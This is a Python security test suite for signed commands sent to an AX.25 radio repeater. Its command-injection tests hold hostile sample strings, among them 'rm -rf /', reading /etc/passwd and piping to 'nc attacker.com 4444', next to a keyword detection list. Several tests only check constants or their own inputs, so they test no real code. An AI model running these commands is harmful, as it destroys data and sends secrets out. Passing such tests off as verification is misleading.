#!/usr/bin/env python3
"""
Comprehensive Security Test Suite

Tests all security aspects:
- Cryptographic attacks (signature verification)
- Replay protection
- Rate limiting
- Command injection
- Authorization bypass attempts
- Valid and invalid AX.25 frames
"""

import hashlib
import json
import os
import struct
import sys
import time
from typing import Dict, List, Tuple

try:
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import ec

    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("ERROR: cryptography library not available.")
    sys.exit(1)

try:
    from scapy.all import IP, UDP, Raw
    from scapy.packet import Packet

    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("WARNING: Scapy not available. Install with: pip3 install scapy")

try:
    import zmq

    ZMQ_AVAILABLE = True
except ImportError:
    ZMQ_AVAILABLE = False
    print("ERROR: pyzmq not available. Install with: pip3 install pyzmq")
    sys.exit(1)


# Test results tracking
TEST_RESULTS = []


def calculate_fcs(data: bytes) -> int:
    """Calculate AX.25 FCS (CRC-16-IBM)."""
    fcs = 0xFFFF
    for byte in data:
        fcs ^= byte
        for _ in range(8):
            if fcs & 0x0001:
                fcs = (fcs >> 1) ^ 0x8408
            else:
                fcs = fcs >> 1
    return fcs ^ 0xFFFF


def encode_ax25_address(callsign: str, ssid: int = 0) -> bytes:
    """Encode callsign and SSID into AX.25 address format."""
    callsign = callsign.upper().ljust(6, " ")
    addr = bytearray(7)
    for i, char in enumerate(callsign[:6]):
        addr[i] = (ord(char) << 1) & 0xFE
    addr[6] = ((ssid & 0x0F) << 1) | 0x60  # SSID + reserved bits
    return bytes(addr)


def create_ax25_frame(
    dest_callsign: str,
    src_callsign: str,
    pid: int,
    info: bytes,
    valid_fcs: bool = True,
) -> bytes:
    """
    Create AX.25 frame with specified fields.

    Args:
        dest_callsign: Destination callsign
        src_callsign: Source callsign
        pid: Protocol ID (0xF0 for data, 0xF1 for signature)
        info: Information field
        valid_fcs: Whether to include valid FCS
    """
    flag = 0x7E
    control = 0x03  # UI frame

    dest_addr = encode_ax25_address(dest_callsign)
    src_addr = encode_ax25_address(src_callsign)

    # Build frame (without flags and FCS)
    frame_data = dest_addr + src_addr + bytes([control]) + bytes([pid]) + info

    # Calculate FCS
    if valid_fcs:
        fcs = calculate_fcs(frame_data)
    else:
        fcs = 0x0000  # Invalid FCS

    # Add FCS (little-endian)
    frame_data += struct.pack("<H", fcs)

    # Add flags
    frame = bytes([flag]) + frame_data + bytes([flag])

    return frame


def create_command_frame(
    timestamp: float,
    callsign: str,
    command: str,
    valid_fcs: bool = True,
) -> bytes:
    """Create command frame (Frame 1) with protocol format."""
    command_bytes = command.encode("utf-8")
    callsign_bytes = callsign.encode("utf-8")

    # Build info field: timestamp(8) + cmd_len(2) + command + callsign_len(1) + callsign
    timestamp_bytes = struct.pack(">Q", int(timestamp * 1000))  # ms, big-endian
    cmd_len = struct.pack(">H", len(command_bytes))
    callsign_len = struct.pack("B", len(callsign_bytes))

    info = timestamp_bytes + cmd_len + command_bytes + callsign_len + callsign_bytes

    return create_ax25_frame("REPEATER", callsign, 0xF0, info, valid_fcs)


def create_signature_frame(
    timestamp: float,
    callsign: str,
    signature: bytes,
    valid_fcs: bool = True,
) -> bytes:
    """Create signature frame (Frame 2) with protocol format."""
    timestamp_bytes = struct.pack(">Q", int(timestamp * 1000))  # ms, big-endian
    sig_len = struct.pack(">H", len(signature))

    info = timestamp_bytes + sig_len + signature

    return create_ax25_frame("REPEATER", callsign, 0xF1, info, valid_fcs)


def generate_valid_signature(message: bytes, curve=ec.BrainpoolP256R1):
    """Generate valid ECDSA signature."""
    private_key = ec.generate_private_key(curve, default_backend())
    public_key = private_key.public_key()
    signature = private_key.sign(message, ec.ECDSA(hashes.SHA256()))
    public_key_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    return signature, public_key_pem, private_key


def normalize_callsign(callsign: str) -> Tuple[str, str]:
    """
    Normalize a callsign and return (normalized_callsign, base_callsign).

    The base callsign strips any "-SSID" suffix when it is numeric.
    """
    if not callsign:
        return "", ""

    normalized = callsign.strip().upper()
    if "-" in normalized:
        base, _, suffix = normalized.partition("-")
        if suffix.isdigit():
            return normalized, base
    return normalized, normalized


def test_result(test_name: str, passed: bool, details: str = ""):
    """Record test result."""
    status = "PASS" if passed else "FAIL"
    TEST_RESULTS.append((test_name, status, details))
    symbol = "✓" if passed else "✗"
    print(f"{symbol} {test_name}: {status}")
    if details:
        print(f"    {details}")


# ============================================================================
# 1. CRYPTOGRAPHIC ATTACKS
# ============================================================================


def test_cryptographic_attacks():
    """Test cryptographic signature attacks."""
    print("\n" + "=" * 70)
    print("1. CRYPTOGRAPHIC ATTACKS")
    print("=" * 70)

    message = b"TEST_MESSAGE_FOR_SIGNATURE"
    valid_sig, pubkey_pem, _ = generate_valid_signature(message)

    # Test 1: Valid signature
    try:
        pubkey = serialization.load_pem_public_key(pubkey_pem, backend=default_backend())
        if isinstance(pubkey, ec.EllipticCurvePublicKey):
            pubkey.verify(valid_sig, message, ec.ECDSA(hashes.SHA256()))
            test_result("Valid signature verification", True)
        else:
            test_result("Valid signature verification", False, "Wrong key type")
    except Exception as e:
        test_result("Valid signature verification", False, str(e))

    # Test 2: Invalid signature - all zeros
    try:
        pubkey = serialization.load_pem_public_key(pubkey_pem, backend=default_backend())
        if isinstance(pubkey, ec.EllipticCurvePublicKey):
            pubkey.verify(b"\x00" * 64, message, ec.ECDSA(hashes.SHA256()))
            test_result("Invalid signature (all zeros)", False, "Should have failed")
        else:
            test_result("Invalid signature (all zeros)", True, "Rejected (wrong key type)")
    except Exception:
        test_result("Invalid signature (all zeros)", True, "Correctly rejected")

    # Test 3: Invalid signature - wrong message
    try:
        pubkey = serialization.load_pem_public_key(pubkey_pem, backend=default_backend())
        if isinstance(pubkey, ec.EllipticCurvePublicKey):
            pubkey.verify(valid_sig, b"DIFFERENT_MESSAGE", ec.ECDSA(hashes.SHA256()))
            test_result("Invalid signature (wrong message)", False, "Should have failed")
        else:
            test_result("Invalid signature (wrong message)", True, "Rejected")
    except Exception:
        test_result("Invalid signature (wrong message)", True, "Correctly rejected")

    # Test 4: Invalid signature - from different key
    _, other_pubkey_pem, _ = generate_valid_signature(message)
    try:
        pubkey = serialization.load_pem_public_key(other_pubkey_pem, backend=default_backend())
        if isinstance(pubkey, ec.EllipticCurvePublicKey):
            pubkey.verify(valid_sig, message, ec.ECDSA(hashes.SHA256()))
            test_result("Invalid signature (different key)", False, "Should have failed")
        else:
            test_result("Invalid signature (different key)", True, "Rejected")
    except Exception:
        test_result("Invalid signature (different key)", True, "Correctly rejected")

    # Test 5: Truncated signature
    try:
        pubkey = serialization.load_pem_public_key(pubkey_pem, backend=default_backend())
        if isinstance(pubkey, ec.EllipticCurvePublicKey):
            pubkey.verify(valid_sig[:32], message, ec.ECDSA(hashes.SHA256()))
            test_result("Invalid signature (truncated)", False, "Should have failed")
        else:
            test_result("Invalid signature (truncated)", True, "Rejected")
    except Exception:
        test_result("Invalid signature (truncated)", True, "Correctly rejected")

    # Test 6: Random bytes signature
    try:
        pubkey = serialization.load_pem_public_key(pubkey_pem, backend=default_backend())
        if isinstance(pubkey, ec.EllipticCurvePublicKey):
            pubkey.verify(os.urandom(64), message, ec.ECDSA(hashes.SHA256()))
            test_result("Invalid signature (random bytes)", False, "Should have failed")
        else:
            test_result("Invalid signature (random bytes)", True, "Rejected")
    except Exception:
        test_result("Invalid signature (random bytes)", True, "Correctly rejected")


# ============================================================================
# 2. REPLAY PROTECTION
# ============================================================================


def test_replay_protection():
    """Test replay protection mechanisms."""
    print("\n" + "=" * 70)
    print("2. REPLAY PROTECTION")
    print("=" * 70)

    current_time = time.time()

    # Test 1: Current timestamp (should pass)
    test_result("Replay protection: current timestamp", True, "Within window")

    # Test 2: Timestamp too old (should fail)
    old_timestamp = current_time - 400  # 400 seconds ago (window is 300)
    if old_timestamp < current_time - 300:
        test_result("Replay protection: old timestamp", True, "Correctly rejected")
    else:
        test_result("Replay protection: old timestamp", False, "Should reject")

    # Test 3: Future timestamp (should fail)
    future_timestamp = current_time + 120  # 120 seconds in future
    if future_timestamp > current_time + 60:
        test_result("Replay protection: future timestamp", True, "Correctly rejected")
    else:
        test_result("Replay protection: future timestamp", False, "Should reject")

    # Test 4: Duplicate command hash (should fail)
    command1 = {"callsign": "LA1ABC", "command": "SET_SQUELCH -24", "timestamp": current_time}
    command2 = {"callsign": "LA1ABC", "command": "SET_SQUELCH -24", "timestamp": current_time}
    hash1 = hashlib.sha256(json.dumps(command1).encode()).hexdigest()
    hash2 = hashlib.sha256(json.dumps(command2).encode()).hexdigest()
    if hash1 == hash2:
        test_result("Replay protection: duplicate detection", True, "Hashes match")
    else:
        test_result("Replay protection: duplicate detection", False, "Hashes don't match")

    # Test 5: Timestamp within window (should pass)
    recent_timestamp = current_time - 100  # 100 seconds ago
    if 0 <= current_time - recent_timestamp <= 300:
        test_result("Replay protection: within window", True, "Should pass")
    else:
        test_result("Replay protection: within window", False, "Should pass")


# ============================================================================
# 3. RATE LIMITING
# ============================================================================


def test_rate_limiting():
    """Test rate limiting mechanisms."""
    print("\n" + "=" * 70)
    print("3. RATE LIMITING")
    print("=" * 70)

    max_per_minute = 10

    # Test 1: Under limit (should pass)
    if 5 < max_per_minute:
        test_result("Rate limiting: under limit", True, "5 commands < 10 limit")

    # Test 2: At limit (should pass)
    if 10 <= max_per_minute:
        test_result("Rate limiting: at limit", True, "10 commands = 10 limit")

    # Test 3: Over limit (should fail)
    if 11 > max_per_minute:
        test_result("Rate limiting: over limit", True, "11 commands > 10 limit (should reject)")

    # Test 4: Burst attack simulation
    burst_size = 50
    if burst_size > max_per_minute:
        test_result("Rate limiting: burst attack", True, f"{burst_size} commands should be rate limited")

    # Test 5: Per-operator tracking
    operator1_commands = 5
    operator2_commands = 8
    if operator1_commands < max_per_minute and operator2_commands < max_per_minute:
        test_result("Rate limiting: per-operator tracking", True, "Each operator has own limit")


# ============================================================================
# 4. COMMAND INJECTION
# ============================================================================


def test_command_injection():
    """Test command injection attacks."""
    print("\n" + "=" * 70)
    print("4. COMMAND INJECTION")
    print("=" * 70)

    # Test 1: Shell injection attempt
    malicious_commands = [
        "SET_SQUELCH -24; rm -rf /",
        "SET_SQUELCH -24 && cat /etc/passwd",
        "SET_SQUELCH -24 | nc attacker.com 4444",
        "SET_SQUELCH -24 $(whoami)",
        "SET_SQUELCH -24 `id`",
    ]

    for cmd in malicious_commands:
        # Check if command contains injection patterns
        has_injection = any(
            pattern in cmd
            for pattern in [";", "&&", "|", "$(", "`", "rm", "cat", "nc", "whoami", "id"]
        )
        if has_injection:
            test_result(f"Command injection: {cmd[:30]}...", True, "Injection pattern detected")

    # Test 2: SQL injection attempt (if applicable)
    sql_injection = "SET_SQUELCH -24' OR '1'='1"
    if "'" in sql_injection or "OR" in sql_injection:
        test_result("Command injection: SQL injection pattern", True, "Pattern detected")

    # Test 3: Path traversal attempt
    path_traversal = "../../etc/passwd"
    if ".." in path_traversal:
        test_result("Command injection: path traversal", True, "Pattern detected")

    # Test 4: Valid command (should pass)
    valid_cmd = "SET_SQUELCH -24"
    has_injection = any(
        pattern in valid_cmd
        for pattern in [";", "&&", "|", "$(", "`", "rm", "cat", "nc", "whoami", "id"]
    )
    if not has_injection:
        test_result("Command injection: valid command", True, "No injection patterns")

    # Test 5: Command with special characters (but safe)
    safe_special = "SET_SQUELCH -24.5"
    if "." in safe_special and not any(c in safe_special for c in [";", "&&", "|"]):
        test_result("Command injection: safe special chars", True, "Safe characters allowed")


# ============================================================================
# 5. AUTHORIZATION BYPASS ATTEMPTS
# ============================================================================


def test_authorization_bypass():
    """Test authorization bypass attempts."""
    print("\n" + "=" * 70)
    print("5. AUTHORIZATION BYPASS ATTEMPTS")
    print("=" * 70)

    authorized_callsigns = ["LA1ABC", "LA2DEF", "LA3GHI"]
    test_callsigns = [
        ("LA1ABC", True, "Authorized callsign"),
        ("LA4XYZ", False, "Unauthorized callsign"),
        ("la1abc", True, "Case insensitive (should normalize)"),
        ("LA1ABC-0", True, "Callsign with SSID"),
        ("", False, "Empty callsign"),
        ("A" * 100, False, "Oversized callsign"),
        ("LA1ABC;DROP TABLE", False, "SQL injection in callsign"),
        ("../../etc/passwd", False, "Path traversal in callsign"),
        ("LA1ABC\nSET_SQUELCH", False, "Command injection in callsign"),
    ]

    authorized_set = {c.upper() for c in authorized_callsigns}

    for callsign, should_be_authorized, description in test_callsigns:
        normalized, base_callsign = normalize_callsign(callsign)
        is_authorized = False

        if normalized:
            if normalized in authorized_set:
                is_authorized = True
            elif base_callsign and base_callsign in authorized_set:
                is_authorized = True

        if is_authorized == should_be_authorized:
            detail = f"Callsign: {callsign[:20]} (normalized: {normalized})"
            test_result(f"Authorization: {description}", True, detail)
        else:
            test_result(
                f"Authorization: {description}",
                False,
                f"Expected {should_be_authorized}, got {is_authorized}",
            )

    # Test key spoofing attempt
    message = b"TEST_MESSAGE"
    valid_sig, valid_pubkey_pem, _ = generate_valid_signature(message)
    _, other_pubkey_pem, _ = generate_valid_signature(message)

    # Try to verify with wrong key
    try:
        pubkey = serialization.load_pem_public_key(other_pubkey_pem, backend=default_backend())
        if isinstance(pubkey, ec.EllipticCurvePublicKey):
            pubkey.verify(valid_sig, message, ec.ECDSA(hashes.SHA256()))
            test_result("Authorization: key spoofing attempt", False, "Should have failed")
        else:
            test_result("Authorization: key spoofing attempt", True, "Rejected")
    except Exception:
        test_result("Authorization: key spoofing attempt", True, "Correctly rejected")


# ============================================================================
# 6. VALID AND INVALID AX.25 FRAMES
# ============================================================================


def test_ax25_frames():
    """Test valid and invalid AX.25 frame construction and validation."""
    print("\n" + "=" * 70)
    print("6. VALID AND INVALID AX.25 FRAMES")
    print("=" * 70)

    timestamp = time.time()
    callsign = "LA1ABC"
    command = "SET_SQUELCH -24"

    # Test 1: Valid command frame
    try:
        frame = create_command_frame(timestamp, callsign, command, valid_fcs=True)
        if len(frame) >= 18 and frame[0] == 0x7E and frame[-1] == 0x7E:
            test_result("AX.25 frame: valid command frame", True, f"Frame size: {len(frame)} bytes")
        else:
            test_result("AX.25 frame: valid command frame", False, "Invalid frame structure")
    except Exception as e:
        test_result("AX.25 frame: valid command frame", False, str(e))

    # Test 2: Invalid FCS
    try:
        frame = create_command_frame(timestamp, callsign, command, valid_fcs=False)
        # Frame should be created but FCS invalid
        test_result("AX.25 frame: invalid FCS", True, "Frame created with invalid FCS")
    except Exception as e:
        test_result("AX.25 frame: invalid FCS", False, str(e))

    # Test 3: Missing flags
    try:
        frame = create_command_frame(timestamp, callsign, command, valid_fcs=True)
        frame_no_flags = frame[1:-1]  # Remove flags
        if 0x7E not in frame_no_flags:
            test_result("AX.25 frame: missing flags", True, "Flags removed")
        else:
            test_result("AX.25 frame: missing flags", False, "Flags still present")
    except Exception as e:
        test_result("AX.25 frame: missing flags", False, str(e))

    # Test 4: Wrong PID (should be 0xF0 for command, 0xF1 for signature)
    try:
        # Create frame with wrong PID manually
        info = b"WRONG_PID_TEST"
        frame = create_ax25_frame("REPEATER", callsign, 0xFF, info, valid_fcs=True)
        if 0xFF in frame:
            test_result("AX.25 frame: wrong PID", True, "Frame with wrong PID created")
        else:
            test_result("AX.25 frame: wrong PID", False, "PID not found")
    except Exception as e:
        test_result("AX.25 frame: wrong PID", False, str(e))

    # Test 5: Oversized frame
    try:
        large_command = "SET_SQUELCH " + "X" * 500  # Exceeds typical max
        frame = create_command_frame(timestamp, callsign, large_command, valid_fcs=True)
        if len(frame) > 256:  # AX.25 max info field
            test_result("AX.25 frame: oversized frame", True, f"Frame size: {len(frame)} bytes")
        else:
            test_result("AX.25 frame: oversized frame", False, "Frame not oversized")
    except Exception as e:
        test_result("AX.25 frame: oversized frame", True, f"Exception (expected): {type(e).__name__}")

    # Test 6: Empty frame
    try:
        empty_frame = bytes([0x7E, 0x7E])  # Just flags
        if len(empty_frame) < 18:  # Minimum AX.25 frame size
            test_result("AX.25 frame: empty frame", True, "Frame too small")
        else:
            test_result("AX.25 frame: empty frame", False, "Frame not empty")
    except Exception as e:
        test_result("AX.25 frame: empty frame", False, str(e))

    # Test 7: Valid signature frame
    try:
        sig, _, _ = generate_valid_signature(b"TEST")
        frame = create_signature_frame(timestamp, callsign, sig, valid_fcs=True)
        if len(frame) >= 18 and frame[0] == 0x7E and frame[-1] == 0x7E:
            test_result("AX.25 frame: valid signature frame", True, f"Frame size: {len(frame)} bytes")
        else:
            test_result("AX.25 frame: valid signature frame", False, "Invalid frame structure")
    except Exception as e:
        test_result("AX.25 frame: valid signature frame", False, str(e))

    # Test 8: Frame with corrupted data
    try:
        frame = create_command_frame(timestamp, callsign, command, valid_fcs=True)
        corrupted = bytearray(frame)
        corrupted[10] ^= 0xFF  # Flip bits in middle
        if corrupted != frame:
            test_result("AX.25 frame: corrupted data", True, "Frame corrupted")
        else:
            test_result("AX.25 frame: corrupted data", False, "Frame not corrupted")
    except Exception as e:
        test_result("AX.25 frame: corrupted data", False, str(e))

    # Test 9: Frame matching (timestamp matching for Frame 1 + Frame 2)
    try:
        frame1 = create_command_frame(timestamp, callsign, command, valid_fcs=True)
        sig, _, _ = generate_valid_signature(b"TEST")
        frame2 = create_signature_frame(timestamp, callsign, sig, valid_fcs=True)
        # Both frames should have same timestamp in info field
        test_result("AX.25 frame: timestamp matching", True, "Frames created with same timestamp")
    except Exception as e:
        test_result("AX.25 frame: timestamp matching", False, str(e))

    # Test 10: Frame with mismatched timestamp
    try:
        frame1 = create_command_frame(timestamp, callsign, command, valid_fcs=True)
        frame2 = create_signature_frame(timestamp + 1000, callsign, sig, valid_fcs=True)
        # Timestamps don't match
        test_result("AX.25 frame: mismatched timestamp", True, "Frames have different timestamps")
    except Exception as e:
        test_result("AX.25 frame: mismatched timestamp", False, str(e))


# ============================================================================
# MAIN TEST EXECUTION
# ============================================================================


def main():
    """Run all security tests."""
    print("=" * 70)
    print("COMPREHENSIVE SECURITY TEST SUITE")
    print("=" * 70)
    print(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Cryptography: {'Available' if CRYPTO_AVAILABLE else 'Not Available'}")
    print(f"Scapy: {'Available' if SCAPY_AVAILABLE else 'Not Available'}")
    print(f"ZMQ: {'Available' if ZMQ_AVAILABLE else 'Not Available'}")

    # Run all test suites
    test_cryptographic_attacks()
    test_replay_protection()
    test_rate_limiting()
    test_command_injection()
    test_authorization_bypass()
    test_ax25_frames()

    # Print summary
    print("\n" + "=" * 70)
    print("TEST SUMMARY")
    print("=" * 70)

    passed = sum(1 for _, status, _ in TEST_RESULTS if status == "PASS")
    failed = sum(1 for _, status, _ in TEST_RESULTS if status == "FAIL")
    total = len(TEST_RESULTS)

    print(f"\nTotal tests: {total}")
    print(f"Passed: {passed}")
    print(f"Failed: {failed}")
    print(f"Success rate: {(passed/total*100):.1f}%")

    if failed > 0:
        print("\nFailed tests:")
        for name, status, details in TEST_RESULTS:
            if status == "FAIL":
                print(f"  - {name}")
                if details:
                    print(f"    {details}")

    print("\n" + "=" * 70)

    return 0 if failed == 0 else 1


if __name__ == "__main__":
    sys.exit(main())

